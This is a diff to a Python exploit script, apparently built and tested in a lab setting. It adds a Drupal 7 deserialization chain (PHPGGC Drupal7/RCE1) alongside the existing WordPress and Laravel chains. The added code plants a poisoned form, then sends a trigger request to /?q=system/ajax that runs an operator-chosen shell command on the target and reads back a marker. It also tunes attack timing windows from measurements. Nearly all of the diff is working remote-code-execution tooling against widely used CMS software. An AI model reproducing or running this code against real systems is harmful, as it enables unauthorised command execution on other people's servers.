@@ -189,6 +189,39 @@ def http_get(host: str, port: int, path: str, sid: str | None = None,
     return body
 
 
+def drupal_trigger(host: str, port: int, timeout: float = 15.0) -> bytes:
+    """POST form_build_id=DrupalRCE to /?q=system/ajax - the documented
+    second step of PHPGGC Drupal7/RCE1. The consumer's destructor has
+    already stored the poisoned form in cache_form; rebuilding it runs
+    #process -> drupal_process_attached -> system(). Returns the
+    response body (command output first, then Drupal's error page)."""
+    payload = b"form_build_id=DrupalRCE"
+    host_hdr = host if port == 80 else f"{host}:{port}"
+    req = (f"POST /?q=system/ajax HTTP/1.1\r\nHost: {host_hdr}\r\n"
+           f"Content-Type: application/x-www-form-urlencoded\r\n"
+           f"Content-Length: {len(payload)}\r\n"
+           f"Connection: close\r\n\r\n").encode() + payload
+    s = _conn(host, port)
+    s.sendall(req)
+    s.settimeout(timeout)
+    data = b""
+    try:
+        while True:
+            c = s.recv(65536)
+            if not c:
+                break
+            data += c
+    except (socket.timeout, OSError):
+        pass
+    s.close()
+    if b"\r\n\r\n" not in data:
+        return data
+    head, _, body = data.partition(b"\r\n\r\n")
+    if b"transfer-encoding: chunked" in head.lower():
+        return _dechunk(body)
+    return body
+
+
 def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
     """GET the consumer page with our sid - the request that makes the
     decoder materialise the planted object and fire its gadget.
@@ -255,8 +288,14 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     # app keeps a fresh sid per attempt - the behaviour the green CI
     # was validated with.
     if lab.GADGET == "wordpress":
+        # one session file per run: the carrier rebuilds whatever the
+        # previous attempt left (self-healing), instead of an
+        # ever-growing pile whose page cache slides the baseline.
         sid = sid or lab.sid_new()
     else:
+        # Drupal must NOT reuse: the victim's progress write fatals on
+        # the previous attempt's leftover file state (measured: 63% of
+        # reused-sid attempts die within 80ms vs 27% with a fresh sid).
         sid = lab.sid_new()
     res["sid"] = sid
 
@@ -274,6 +313,9 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
         # inside the splice window), while the payload lives untouched
         # in the second record. A single record would give |R|-|C| < 0
         # (the STRUCT bytes) - the write would add no charge at all.
+        # (Drupal's protected-property NULs cannot ride this channel:
+        # the multipart HEADER parser cuts the line at the first NUL -
+        # measured - so Drupal uses the bio body value below instead.)
         carrier, _ = lab.carrier_hold(sid)
         time.sleep(0.5)
         carrier2, _ = lab.carrier_hold(
@@ -325,6 +367,14 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     body = consumer(host, port, sid)
     res["decode_failed"] = b"Failed to decode" in body
     res["consumer_ok"] = bool(body)
+
+    if lab.GADGET == "drupal":
+        # Drupal7/RCE1 is two-step: the consumer's __destruct only
+        # poisons cache_form; the command runs when that poisoned form
+        # is rebuilt through the AHAH endpoint (the chain's documented
+        # trigger). The output is echoed before Drupal's own error
+        # page, so the marker check runs on THIS response.
+        body = drupal_trigger(host, port)
 
     if OUT_MARKER:
         # Output-based chain (system() from __destruct at shutdown):
@@ -474,6 +524,16 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
         lab.set_gadget("laravel", f"{command};echo {OUT_MARKER}")
         ACTIVE_FILLERS = N_FILLERS
+    elif chain == "drupal":
+        # PHPGGC Drupal7/RCE1 from Drupal core (SchemaCache): the
+        # consumer's __destruct poisons cache_form, the trigger request
+        # (/?q=system/ajax) runs system("<cmd>;echo <marker>") - the
+        # marker is read from the TRIGGER response. Bio geometry (the
+        # payload's protected-property NULs cannot survive a multipart
+        # header line); the target's settings.php stores the field.
+        OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
+        lab.set_gadget("drupal", f"{command};echo {OUT_MARKER}")
+        ACTIVE_FILLERS = N_FILLERS
     else:
         OUT_MARKER = None
         lab.set_gadget("filecache")
@@ -514,11 +574,12 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # overlapping), so steering on them thrashes the bracket. The
     # landing is stochastic anyway and the landable band is only
     # ~7MiB of h, so sample the whole plausible range uniformly.
-    # Laravel measures the same way (at one h both "early" and "late"
-    # occur across attempts: the reclaimable file-cache cushion jitters
-    # +-5MiB per attempt, wider than the bisection's h steps - a
-    # converged bracket just oscillates between the two signals).
-    uniform = chain in ("wordpress", "laravel")
+    # Laravel and Drupal measure the same way (at one h both "early"
+    # and "late" occur across attempts: the reclaimable file-cache
+    # cushion jitters +-5MiB per attempt, wider than the bisection's
+    # h steps - a converged bracket just oscillates between the two
+    # signals).
+    uniform = chain in ("wordpress", "laravel", "drupal")
 
     run_sid = lab.sid_new()   # reused by every attempt (see attempt())
 
@@ -591,6 +652,8 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
             # Sampling outside only wastes attempts.
             if chain == "wordpress":
                 zone = (38_000_000, 54_000_000)
+            elif chain == "drupal":
+                zone = (13_000_000, 23_000_000)
             else:
                 zone = (6_000_000, 18_000_000)
             h = random.randint(max(int(h_min), zone[0]),
@@ -618,11 +681,13 @@ def main() -> int:
                    help="shell command to run on the target")
     p.add_argument("--attempts", type=int, default=40,
                    help="maximum interruption attempts (default 40)")
-    p.add_argument("--chain", choices=("filecache", "wordpress", "laravel"),
+    p.add_argument("--chain",
+                   choices=("filecache", "wordpress", "laravel", "drupal"),
                    default="filecache",
                    help="planted gadget: the lab's FileCache (default), "
-                        "WordPress core (WP_HTML_Token) or Laravel's own "
-                        "vendor tree (PHPGGC Laravel/RCE9)")
+                        "WordPress core (WP_HTML_Token), Laravel's vendor "
+                        "tree (PHPGGC Laravel/RCE9) or Drupal core "
+                        "(PHPGGC Drupal7/RCE1)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
